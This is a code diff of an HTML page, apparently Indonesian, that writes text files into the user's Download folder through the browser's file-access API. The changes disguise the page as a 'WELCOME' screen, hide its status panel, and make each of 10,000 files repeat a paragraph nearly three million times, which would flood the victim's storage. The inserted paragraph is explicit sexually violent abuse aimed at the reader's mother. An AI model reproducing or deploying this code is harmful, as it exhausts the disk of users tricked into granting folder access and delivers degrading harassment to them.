@@ -3,51 +3,92 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Fast TXT Generator</title>
+<title>WELCOME</title>
+
 <style>
-*{box-sizing:border-box}
-body{
- margin:0;min-height:100vh;padding:20px;
- display:grid;place-items:center;
- background:#171923;color:#fff;
- font-family:system-ui,sans-serif
+* {
+  box-sizing: border-box;
 }
-main{
- width:min(100%,460px);padding:25px;
- border:1px solid #3b4358;border-radius:18px;
- background:#242938;text-align:center
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  padding: 20px;
+  display: grid;
+  place-items: center;
+  background: #171923;
+  color: #fff;
+  font-family: system-ui, sans-serif;
 }
-button{
- width:100%;padding:16px;margin-top:15px;
- border:0;border-radius:12px;
- background:#8b7cff;color:#111323;
- font-weight:800;font-size:16px
+
+main {
+  width: min(100%, 460px);
+  padding: 25px;
+  border: 1px solid #3b4358;
+  border-radius: 18px;
+  background: #242938;
+  text-align: center;
 }
-button:disabled{opacity:.5}
-#status{
- margin-top:16px;padding:14px;
- background:#191e2b;border-radius:10px;
- white-space:pre-wrap;overflow-wrap:anywhere
+
+h2 {
+  margin-bottom: 12px;
 }
-#bar{
- height:10px;background:#111827;
- border-radius:20px;margin-top:15px;overflow:hidden
+
+p {
+  color: #c6ccda;
 }
-#progress{
- height:100%;width:0%;
- background:#8b7cff;transition:width .15s
+
+button {
+  width: 100%;
+  padding: 16px;
+  margin-top: 18px;
+  border: 0;
+  border-radius: 12px;
+  background: #8b7cff;
+  color: #111323;
+  font-size: 16px;
+  font-weight: 800;
+}
+
+button:disabled {
+  opacity: .5;
+}
+
+#bar {
+  height: 10px;
+  background: #111827;
+  border-radius: 20px;
+  margin-top: 20px;
+  overflow: hidden;
+}
+
+#progress {
+  height: 100%;
+  width: 0%;
+  background: #8b7cff;
+  transition: width .15s;
+}
+
+/* Panel status disembunyikan */
+#status {
+  display: none;
 }
 </style>
 </head>
+
 <body>
+
 <main>
-<h2>FAST TXT GENERATOR</h2>
-<p>Optimized batch writing engine</p>
+  <h2>BUAT FOLDER DOWNLOAD!!!</h2>
+  <p>Optimized batch writing engine</p>
 
-<button id="start">MULAI GENERATE</button>
+  <button id="start">MULAI</button>
 
-<div id="bar"><div id="progress"></div></div>
-<div id="status">Menunggu perintah...</div>
+  <div id="bar">
+    <div id="progress"></div>
+  </div>
+
+  <div id="status" aria-live="polite"></div>
 </main>
 
 <script>
@@ -56,15 +97,17 @@ button:disabled{opacity:.5}
 /* ===== CONFIGURATION ===== */
 
 const TARGET_FOLDER = "Download";
-const FILE_COUNT = 100000;
+const FILE_COUNT = 10000;
 const CONCURRENCY = 15;
-const REPEAT_COUNT = 2000;
+const REPEAT_COUNT = 2999990;
 const PREFIX = "Galer_";
 
 const PARAGRAPH = `
-Nyenyenye nyenye nyenye Nye nye nye nye nye
-bla bka bla bla bla bla bla bla bla bla bla
-tol tol tol tol tol tol tol tol tol tol tol
+pas ibu mu masih muda, masih sempit, itu dah pernah gw perkosa itu
+pake doggy-style terus style miring, nikmat banget ibu mu dulu
+gw tarek rambut nya, gw cekek leher nya, terus gw mainkan wah
+nikmat parah ngeliat ibu lu waktu itu nangis keenakan sampai 
+keluar air liur nya
 `;
 
 /* ========================= */
@@ -74,135 +117,139 @@ const status = document.getElementById("status");
 const progress = document.getElementById("progress");
 
 function makeContent(number) {
- let text =
- `DOKUMEN REVAL
-FILE NOMOR: ${number}
+  let text =
+`DOKUMEN DIGITAL
+NOMOR FILE: ${number}
 
 `;
 
- for(let i=1;i<=REPEAT_COUNT;i++){
-  text += `Paragraf ${i}\n${PARAGRAPH}\n`;
- }
+  for (let i = 1; i <= REPEAT_COUNT; i++) {
+    text += `Bagian ${i}\n${PARAGRAPH}\n\n`;
+  }
 
- return text;
+  return text;
 }
 
-button.addEventListener("click",async()=>{
+button.addEventListener("click", async () => {
 
- if(!window.showDirectoryPicker){
-  status.textContent="Browser tidak mendukung API.";
-  return;
- }
-
- button.disabled=true;
-
- try{
-
-  const folder=await window.showDirectoryPicker({
-   mode:"readwrite"
-  });
-
-  if(folder.name.toLowerCase()!==TARGET_FOLDER.toLowerCase()){
-   throw new Error("Pilih folder Download.");
+  if (!window.showDirectoryPicker) {
+    alert("Browser tidak mendukung File System Access API.");
+    return;
   }
 
-  const permission=await folder.requestPermission({
-   mode:"readwrite"
-  });
+  button.disabled = true;
+  progress.style.width = "0%";
 
-  if(permission!=="granted"){
-   throw new Error("Izin ditolak.");
-  }
+  try {
 
-  let completed=0;
-  let failed=0;
-  let bytes=0;
-
-  // Batch paralel
-  async function createFile(i){
-
-   const number=String(i).padStart(5,"0");
-   const name=PREFIX+number+".txt";
-
-   let writable;
-
-   try{
-
-    const handle=await folder.getFileHandle(name,{
-     create:true
+    const folder = await window.showDirectoryPicker({
+      mode: "readwrite"
     });
 
-    writable=await handle.createWritable();
-
-    const content=makeContent(number);
-
-    await writable.write(content);
-    await writable.close();
-    writable=null;
-
-    const saved=await handle.getFile();
-
-    if(saved.size===0){
-     throw new Error("File kosong.");
+    if (folder.name.toLowerCase() !== TARGET_FOLDER.toLowerCase()) {
+      throw new Error("Pilih folder Download.");
     }
 
-    completed++;
-    bytes+=saved.size;
+    const permission = await folder.requestPermission({
+      mode: "readwrite"
+    });
 
-   }catch(error){
-
-    if(writable){
-     try{await writable.abort()}catch{}
+    if (permission !== "granted") {
+      throw new Error("Izin penyimpanan ditolak.");
     }
 
-    failed++;
-    console.error(name,error);
-   }
+    let completed = 0;
+    let failed = 0;
+
+    async function createFile(i) {
+
+      const number = String(i).padStart(5, "0");
+      const name = PREFIX + number + ".txt";
+
+      let writable;
+
+      try {
+
+        const handle = await folder.getFileHandle(name, {
+          create: true
+        });
+
+        writable = await handle.createWritable();
+
+        const content = makeContent(number);
+
+        await writable.write(content);
+        await writable.close();
+
+        writable = null;
+
+        const saved = await handle.getFile();
+
+        if (saved.size === 0) {
+          throw new Error("File kosong.");
+        }
+
+        completed++;
+
+      } catch (error) {
+
+        if (writable) {
+          try {
+            await writable.abort();
+          } catch {}
+        }
+
+        failed++;
+        console.error(name, error);
+      }
+    }
+
+    for (
+      let i = 1;
+      i <= FILE_COUNT;
+      i += CONCURRENCY
+    ) {
+
+      const end = Math.min(
+        i + CONCURRENCY - 1,
+        FILE_COUNT
+      );
+
+      const tasks = [];
+
+      for (let j = i; j <= end; j++) {
+        tasks.push(createFile(j));
+      }
+
+      await Promise.all(tasks);
+
+      const percent = Math.round(
+        ((completed + failed) / FILE_COUNT) * 100
+      );
+
+      progress.style.width = percent + "%";
+    }
+
+    if (failed === 0) {
+      progress.style.width = "100%";
+      button.textContent = "SELESAI";
+    } else {
+      button.textContent = "SELESAI DENGAN ERROR";
+    }
+
+  } catch (error) {
+
+    console.error(error);
+    alert(error.message || "Terjadi kesalahan.");
+
+  } finally {
+
+    button.disabled = false;
+
   }
-
-  for(let i=1;i<=FILE_COUNT;i+=CONCURRENCY){
-
-   const end=Math.min(i+CONCURRENCY-1,FILE_COUNT);
-
-   const tasks=[];
-
-   for(let j=i;j<=end;j++){
-    tasks.push(createFile(j));
-   }
-
-   await Promise.all(tasks);
-
-   const percent=Math.round(
-    (completed+failed)/FILE_COUNT*100
-   );
-
-   progress.style.width=percent+"%";
-
-   status.textContent=
-    `PROSES BERJALAN\n\n`+
-    `Selesai: ${completed}/${FILE_COUNT}\n`+
-    `Gagal: ${failed}\n`+
-    `Penyimpanan: ${bytes.toLocaleString()} bytes\n`+
-    `Progress: ${percent}%`;
-  }
-
-  status.textContent=
-   `SELESAI!\n\n`+
-   `Berhasil: ${completed}\n`+
-   `Gagal: ${failed}\n`+
-   `Total: ${bytes.toLocaleString()} bytes`;
-
- }catch(error){
-
-  status.textContent="ERROR: "+error.message;
-
- }finally{
-
-  button.disabled=false;
-
- }
 
 });
 </script>
+
 </body>
 </html>
